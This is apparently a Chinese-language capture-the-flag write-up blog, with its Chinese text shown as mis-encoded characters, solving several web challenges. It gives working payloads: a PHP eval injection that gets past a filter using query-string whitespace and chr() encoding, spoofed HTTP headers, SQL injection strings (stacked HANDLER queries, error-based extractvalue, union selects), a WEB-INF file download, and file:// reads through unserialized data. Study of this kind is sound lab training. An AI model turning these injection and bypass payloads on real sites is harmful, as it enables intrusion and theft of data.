<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#å°†numå€¼èµ‹ç»™å˜é‡ $str</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#evalï¼Œå±é™©.ï¼ˆå¾ˆè´´å¿ƒåœ°ç»™äº†åˆ†å·ï¼Ÿä¸ç”¨åŠ äº†</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¯•äº†è¯•è¾“å…¥åªèƒ½è¾“æ•°å­—å’Œå…¶ä»–ä¸€äº›å­—ç¬¦ã€‚ã€‚ã€‚</p>
<blockquote>
<p>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>åˆ é™¤å‰åçš„ç©ºç™½ç¬¦ï¼ˆç©ºæ ¼ç¬¦ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ç­‰ç»Ÿç§°ä¸ºç©ºç™½ç¬¦ï¼‰
<span class="token number">2.</span>å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰
   <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> ç©ºç™½å­—ç¬¦
    ç©ºç™½å­—ç¬¦åŒ…æ‹¬ç©ºæ ¼ï¼ˆï¼‰ã€åˆ¶è¡¨ç¬¦ï¼ˆ\tï¼‰ã€æ¢è¡Œç¬¦ï¼ˆ\nï¼‰ã€å›è½¦ç¬¦ï¼ˆ\rï¼‰ç­‰ã€‚
   <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>æ ‡ç‚¹ç¬¦å·å’Œç‰¹æ®Šç¬¦å·
    åƒå¸¸è§çš„æ ‡ç‚¹ç¬¦å·ï¼ˆå¦‚é€—å· <span class="token punctuation">,</span>ã€å¥å· <span class="token operator">.</span>ã€é—®å· <span class="token operator">?</span>ã€æ„Ÿå¹å· <span class="token operator">!</span> ç­‰ï¼‰ä»¥åŠå…¶ä»–ç‰¹æ®Šç¬¦å·ï¼ˆå¦‚ @ã€<span class="token comment">#ã€$ã€%ã€^ã€&amp;ã€*ã€(ã€)ã€-ã€+ã€=ã€[ã€]ã€{ã€}ã€|ã€\ã€/ ç­‰ï¼‰éƒ½ä¼šè¢«è½¬æ¢ã€‚</span>
   <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>æ§åˆ¶å­—ç¬¦
ä¾‹å¦‚ <span class="token constant">ASCII</span> ç å€¼åœ¨ <span class="token number">0</span> <span class="token operator">-</span> <span class="token number">31</span> ä¹‹é—´çš„å­—ç¬¦ï¼ˆå¦‚ç©ºå­—ç¬¦ \<span class="token number">0</span>ã€æ¢é¡µç¬¦ \f ç­‰ï¼‰ä¹Ÿä¼šè¢«è½¬æ¢ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote>
<p><strong>æ‰€ä»¥ç”¨ç©ºç™½å­—ç¬¦å¯ä»¥å·æ¢æ¢æŸ±ï¼Œç»•è¿‡wafï¼ˆ%20numï¼‰å´è¿˜æ˜¯ä¼ ä¸€æ ·çš„å‚æ•°(num)ã€‚ã€‚ã€‚å¥½é˜´é™©ï¼ˆ</strong></p>
<p>è¯•äº†è¯•<code>?%20num=1;phpinfo()</code>å¯ï¼Œä½†å…¶ä»–ç©ºç™½ç¬¦å°±æ²¡é‚£ä¹ˆå¹¸è¿äº†ï¼ˆ</p>
<p>ç”¨systemå‘ç°ä¸è¡Œï¼ˆå•Šï¼Ÿ</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/04980deee4ee102d6c2eab0ad6d2d30b.png"></p>
<p><del>å¥½å¥½å¥½</del></p>
<p>â€œ /è¢«banäº†ï¼ˆ</p>
<p>è¯´æ¥ä¹Ÿå·§ï¼Œåˆšåœ¨å¿…åšçš„rceä¸­ç¢°åˆ°<code>var_dump(scandir(chr(47)));è¯»å–æ ¹ç›®å½•</code>ï¼ˆé»‘å¹•</p>
<p> var_dump()å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚</p>
<p>ä¸ºå•¥è¿™é‡Œå¤´ä¸ç”¨åŠ åŒå¼•å·ï¼Ÿ</p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">chr(47)` æœ¬èº«å°±ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸² `"/"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote>
<p>charè¿˜æœ‰è¿™å¦™ç”¨ï¼ˆ</p>
<pre class="line-numbers language-none"><code class="language-none">?%20num=1;var_dump(scandir(chr(47)))
 
string(5) "f1agg"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>é€šè¿‡ <code>.</code> è¿ç®—ç¬¦æŠŠè¿™äº›ç”± <code>chr()</code> å‡½æ•°ç”Ÿæˆçš„å­—ç¬¦è¿æ¥èµ·æ¥</p>
</blockquote>
<p>æƒ³ç»•è¿‡\å¿…é¡»ç”¨chr(),-&gt;â€/flaggâ€,catå•¥çš„ç”¨ä¸äº†äº†ï¼Œå¾—ç”¨ä¸ªå¸¦æ‹¬å·çš„</p>
<p>æå‡ºå°æœ¬æœ¬ï¼ˆ</p>
<pre class="line-numbers language-none"><code class="language-none">file_get_contentsã€highlight_file() ï¼Œshow_source()

?%20num=1;var_dump(show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æ˜¯åœ¨/flaggä¸‹ï¼Œ<del>ç¬¬ä¸€æ¬¡å¿˜åŠ chr(47)äº†</del></p>
<hr>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h3><p>çœ‹è§è“è‰²æ°›å›´</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ba7e5d6f4653e6e5d3db349a940b7c6f.png"></p>
<p><code>href="Secret.php"&gt;</code></p>
<p><code>It doesn't come from 'https://Sycsecret.buuoj.cn'</code></p>
<blockquote>
<p>ç½‘ç«™ç®¡ç†å‘˜å¯ä»¥é€šè¿‡åˆ†æ <code>Referer</code> å­—æ®µæ¥äº†è§£ç”¨æˆ·æ˜¯ä»å“ªäº›å¤–éƒ¨ç½‘ç«™æˆ–è€…é¡µé¢è¿›å…¥åˆ°è‡ªå·±ç½‘ç«™çš„ã€‚è¯¥å­—æ®µè®°å½•äº†å½“å‰è¯·æ±‚æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯·æ±‚çš„æ¥æºé¡µé¢çš„ URLã€‚</p>
</blockquote>
<p>å¥½å§ï¼ŒåŠ ä¸Šï¼ˆ</p>
<p><code>Please use "Syclover" browser</code></p>
<blockquote>
<p><code>User-Agent</code> æ˜¯å®¢æˆ·ç«¯ï¼ˆå¦‚æµè§ˆå™¨ã€ç§»åŠ¨åº”ç”¨ç­‰ï¼‰åœ¨å‘æœåŠ¡å™¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œé™„å¸¦åœ¨è¯·æ±‚å¤´ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨äºæ ‡è¯†å®¢æˆ·ç«¯è½¯ä»¶çš„ç±»å‹ã€ç‰ˆæœ¬ä»¥åŠè¿è¡Œç¯å¢ƒç­‰ä¿¡æ¯ã€‚</p>
</blockquote>
<p>å¥½å§ï¼Œå†åŠ ä¸Šï¼ˆ</p>
<p><code>No!!! you can only read this locally!!!</code></p>
<p><del>ï¼ˆæµæ±—é»„è±†</del></p>
<blockquote>
<p>X-Forwarded-Foråœ¨ä½¿ç”¨ä»£ç†æœåŠ¡å™¨çš„åœºæ™¯ä¸‹ï¼Œè¯¥å­—æ®µç”¨äºè®°å½•å®¢æˆ·ç«¯çš„çœŸå® IP åœ°å€ã€‚</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ed4c8498fb8fa85dd9e96fdb351ff69b.png"></p>
<hr>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL1-1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL1-1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/6762547f9722a.png" alt="dfb8a353c0093c82c669db8e48864047.png"><br>å•å¼•å·å›´çš„<br><img src="https://pick.lwzheng.tech/2024/12/18/6762547ec1f87.png" alt="37dcb4e8076a072d3478e3ee63d26e0d.png"><br>SQLçš„è¯­æ³•æ ¼å¼è§„å®šâ€“å’Œåé¢çš„æ³¨é‡Šå†…å®¹å¿…é¡»é—´éš”ä¸€ä¸ªç©ºæ ¼<br>åœ¨SQLæ³¨å…¥ä¸­ï¼Œâ€œâ€“+â€å¯ç”¨äºæ³¨é‡Šæ˜¯å› ä¸ºåœ¨SQLè¯­æ³•é‡Œï¼Œâ€œâ€“ â€ï¼ˆåé¢æœ‰ç©ºæ ¼ï¼‰æ˜¯æ ‡å‡†çš„å•è¡Œæ³¨é‡Šèµ·å§‹æ ‡è¯†ï¼Œâ€œ+â€åœ¨è¿™é‡Œå¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ã€‚å½“æ•°æ®åº“æ‰§è¡ŒSQLè¯­å¥æ—¶ï¼Œé‡åˆ°â€œâ€“ â€å°±ä¼šå¿½ç•¥åé¢çš„å†…å®¹ï¼Œæ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œé€šè¿‡æ„é€ åŒ…å«â€œâ€“+â€çš„æ¶æ„è¯­å¥ï¼Œä½¿åé¢çš„æŸ¥è¯¢é€»è¾‘è¢«æ³¨é‡Šæ‰ï¼Œä»è€Œè¾¾åˆ°æ”¹å˜æŸ¥è¯¢åŸæ„ã€è·å–éæ³•æ•°æ®ç­‰ç›®çš„ã€‚<br>æ‰€ä»¥ä¸€å®šè¦æœ‰ç©ºæ ¼å•Šï¼ˆ</p>
<hr>
<h3 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1-1"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1-1" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/676254f13ad0c.png" alt="0a223de355e17decc72863de26a72b52.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f188ae2.png" alt="5a777138a26db07c378cadba24a77570.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f251310.png" alt="215b05e5165b0a292062e36954c398b1.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f31481b.png" alt="236c845da78aa517ba031f0b2b554f48.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f6c7017.png" alt="98d0595f1c0374397a3d1370b7306369.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f77a903.png" alt="2f6ceaccb29373f6fdf89f7a6b651bdb.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/6762c639590d8.png" alt="5dbad5fe33b7be4a387406654588dc4a.png"><br><a href="https://">https://www.mysqlzh.com/doc/126/253.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">1';
handler `1919810931114514` open;
handler `1919810931114514` read first;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>è¿™é“é¢˜æˆ‘å¥½åƒè¢«å‰§é€äº†ï¼ˆï¼Œæœ¬æ¥æƒ³æ‰“å¼€å°æœ¬æœ¬ç¿»ä¸€ç¿»å †å ï¼ˆå› ä¸ºæˆ‘è¶Šçœ‹è¶Šç†Ÿæ‚‰ï¼Œå¥½åƒè¦ç”¨è¿™ä¸ªï¼‰ï¼Œç»“æœå‘ç°å †å å°±æ˜¯ä»è¿™é“é¢˜æŠ„çš„ï¼ˆ<br><img src="https://pick.lwzheng.tech/2024/12/18/6762763fcad8d.png" alt="2ee162ea82c68b0b28b3ac8f6996d071.png"></p>
<pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open as`ddl`;
handler `ddl` read next;--
ä¸€æ ·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<hr>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL1-1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL1-1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL1</h3><p>å…ˆæ”¾ä¸ªå­—å…¸<br><a href="https://">https://www.cnblogs.com/CVE-Lemon/p/16187971.html</a><br><img src="https://pick.lwzheng.tech/2024/12/18/6762554c94cf7.png" alt="afdd780a3c26cc0291a0ff2edfbf27c5.png"><br>/**/,%20ï¼Œ=éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†likeæ²¡è¢«è¿‡æ»¤æ¢=;andä¹Ÿè¢«æäº†ï¼Œç”¨orï¼ˆburpå¯è§ï¼Œåæ­£è¿‡æ»¤äº†ä¸€å †ï¼Œå°±ä¸æ”¾å›¾äº†<br><img src="https://pick.lwzheng.tech/2024/12/18/6762554811cd5.png" alt="75d480ea766c77feff663a8247a6ac96.png"><br>limitæ²¡è¢«è¿‡æ»¤ï¼Œè¯´æ˜æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†<br><img src="https://pick.lwzheng.tech/2024/12/18/67625547539f8.png" alt="30e79d19bae056941cd635f627db1854.png"><br>æŸ¥ä¸€ä¸ªæ–°çš„<br><img src="https://pick.lwzheng.tech/2024/12/18/676255467d276.png" alt="1c7660abc9397a5f09c54c68feadd623.png"><br>%A0ä¸å¯<br><img src="https://pick.lwzheng.tech/2024/12/18/676255458d8b4.png" alt="0ef86a801db09c991dc813e96465423a.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/67625544864a8.png" alt="dd6be0eecab7f9fbb43422f88041b2e7.png"><br>ï¼ˆï¼‰å¯ï¼Œå°è¯•äº†ä¸‹å¯ä¸º<code>1'or(1)like(1)#</code>ï¼Œä¸‡èƒ½å¯†ç æˆåŠŸåå‘ç°åªæœ‰è¿™ä¸ªï¼Œç”¨æŠ¥é”™æ³¨å…¥<br><img src="https://pick.lwzheng.tech/2024/12/18/67627335bef31.png" alt="15b57d9a0152f4a97cf94568454d8e96.png"><br>æˆ‘ç”¨æˆ‘çš„é‚£ä¸ªæŠ¥é”™æ³¨å…¥çš„æ–¹æ³•å‘ç°ä¸€ç›´ä¸å¯¹ï¼Œç„¶åå‘ç°æ˜¯randè¢«è¿‡æ»¤äº†ã€‚<del>å¥½å¥½å¥½ï¼Œä¸‰ç§æ–¹æ³•é€‰äº†ä¸€ç§å°±æ­£å¥½è¢«è¿‡æ»¤äº†</del><br><img src="https://pick.lwzheng.tech/2024/12/18/676255439ec72.png" alt="467fa8d31cd839e3b1d0cc4f10819f9e.png"><br>é‚£å°±æ¢ä¸ª<br>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/csyxf/p/10241456.html]">https://www.cnblogs.com/csyxf/p/10241456.html]</a>(https://ï¼‰extractvalueæ— äº‹ï¼Œé‚ç”¨<br><img src="https://pick.lwzheng.tech/2024/12/18/67625542b93af.png" alt="91bf424956abef30cb47ef6c4db7022f.png"><br>è¿™é‡Œæˆ‘å‘ç°ç›´æ¥ç”¨hackbarä¼ ä¸å¯¹ï¼Œç„¶ååœ¨ç™»å½•ç•Œé¢é‡æ–°å°è¯•äº†ä¸€ä¸‹ï¼Œå¹¶è§‚å¯Ÿä¸Šæ–¹ç½‘å€ï¼Œå‘ç°éœ€è¦ç”¨URLç¼–ç åå†execute<br><del>ï¼ˆå¯èƒ½æ˜¯å› ä¸ºè¿‡æ»¤çš„å¤ªå¤šäº†å§ï¼Œå¤ªå±‘äº†</del><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(database())))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7fde819.png" alt="3fa376449c53c54edcb9227885473a8a.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e787aefc.png" alt="894a4b1c6d1a51c1fd51954ac75dde7d.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e78ef348.png" alt="77d4fac4a64b308ec7f3098ee092cf1e.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e79b2b08.png" alt="85556fa19c74c093ea33a47a536d314e.png"><br>ç„¶åå‘ç°substrè¢«è¿‡æ»¤äº†ï¼ˆæ‚²<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7ab2063.png" alt="ab4c261fdcca91d8108362ae777a8491.png"><br>é‚å†æ‰¾ï¼ˆ<br><a href="https://">https://www.wanfa688.com/html/Products/478771.html</a><br>è¯•äº†ä¸€ä¸‹leftå’Œrightéƒ½æŒºå®‰å…¨çš„<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e80aed15.png" alt="3f3cf8afbbb43a3fa4b255b6a7080e0f.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,right((select(group_concat(password))from(geek.H4rDsq1)),31))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e81e2af4.png" alt="398dde33f15ac6556d2337bf694af22f.png"><br>æ‹¼ä¸€ä¸‹<br><code>flag{589e7b10-f37f-4255-84d3-a323ae257d5b}</code></p>
<hr>
<p><del>è¯è¯´sqlmapèƒ½ä¸èƒ½å†å¤šå‡ºä¸€äº›è„šæœ¬ä»€ä¹ˆçš„ï¼Œä¸å¤Ÿç”¨å“‡</del><br><del>ç­‰æˆ‘å¤ä¹ å®Œcppä¸€å®šé«˜äº§ä¼¼é‚£å•¥å’•å’•å’•å’•</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2589138a0ce77cd759f201600a1de079.png"></p>
<p>ç¬¬äºŒé¡µ</p>
<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p><img src="https://pick.lwzheng.tech/2025/01/30/679b8f9e2f284.png" alt="2aa097d60db4614df1889feb73c9e37a.png"><br>Are you sure the flag is here? ? ?<br>=&gt;éœ€ç”¨post</p>
<blockquote>
<p>java+WEB-INFæ˜¯javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•<br>WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:<br>/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚<br>/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­<br>/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶<br>/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚<br>/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶<br>æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </p>
</blockquote>
<p>/WEB-INF/web.xml+post=&gt;com.wm.ctf.FlagController<br><img src="https://pick.lwzheng.tech/2025/01/30/679b915b78a65.png" alt="d8258a6166b96cdf02779b7bf957ed0f.png"><br> servlet class+åŠ ä¸Šclassesæ¥è®¿é—®æ¥è®¿é—®classæ–‡ä»¶ç›®å½•ï¼Œä¸”æ–‡ä»¶åç¼€ä¸º.class<br><code>Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<pre class="line-numbers language-none"><code class="language-none">ZmxhZ3tkNjMxYzVlYi1iOTJmLTQ0MTYtODVkOC1kMDE5Y2NkZmQ5YWZ9Cg==
flag{d631c5eb-b92f-4416-85d8-d019ccdfd9af}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h3 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h3><p>æ‰«ï¼š/robots.txtï¼Œä¸‹user.php.bakï¼›flag.php</p>
<pre class="line-numbers language-none"><code class="language-none">function get($url)
  {
      $ch = curl_init();

      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      $output = curl_exec($ch);
      $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
      if($httpCode == 404) {
          return 404;
      }
      curl_close($ch);#curl ssrf

      return $output;
  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ³¨å†Œä¸€ä¸ªï¼Œåœ¨noåsqlæ³¨å…¥ï¼Œè¿‡æ»¤äº†ä¸€äº›ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">?no=1 order by 4æœ‰4åˆ—
?no=-1 union/**/select database(),database(),database(),database()#ï¼Œ2å¤„æœ‰ä¸ªfakebook
?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'# users
?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#  no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS  
?no=-1 union/**/select 1,group_concat(data),3,4 from fakebook.users#
O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:40:"https://github.com/lingqing777/watchlist";},O:8:"UserInfo":3:{s:4:"name";s:4:"qing";s:3:"age";i:18;s:4:"blog";s:40:"https://github.com/lingqing777/watchlist";}
//å¯¹baèµ·æˆ‘æ³¨å†Œäº†ä¸¤éï¼ˆ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>blogç”¨ååºåˆ—åŒ–<br><code>?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:40:"https://github.com/lingqing777/watchlist";}'</code><br><img src="https://pick.lwzheng.tech/2025/02/02/679f241756457.png" alt="9e1ee8b50ef827975e8b9efb8eebd3c7.png"><br>çœ‹äº†ä¸€ä¸‹ï¼Œæ˜¯æºç <br>å¾ˆå¤šæ–¹æ³•éƒ½ä¸è¡Œå»flag.php<br><img src="https://pick.lwzheng.tech/2025/02/02/679f2416d6fdf.png" alt="be4161b71b3e861bd50da4cc32df4f2b.png"><br>çœ‹æ¥åœ¨webç›®å½•ä¸‹ï¼Œfile://è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ<br><code>?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</code></p>
<p><code>PD9waHANCg0KJGZsYWcgPSAiZmxhZ3swYzg1MWNmNS0zZGU3LTQ4ZDItYTA5Yi02OWQxZDY2ZWRiODN9IjsNCmV4aXQoMCk7DQo=</code><br><code>flag{0c851cf5-3de7-48d2-a09b-69d1d66edb83}</code></p>
<hr>
<p>load_file()å‡½æ•°å¯ä»¥åˆ©ç”¨ç»å¯¹è·¯å¾„å»åŠ è½½ä¸€ä¸ªæ–‡ä»¶<br><code>?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+</code><br><img src="https://pick.lwzheng.tech/2025/02/02/679f26e361949.png" alt="f57ca8e4259259d03fb661b7dc8a8566.png"></p>
<hr>
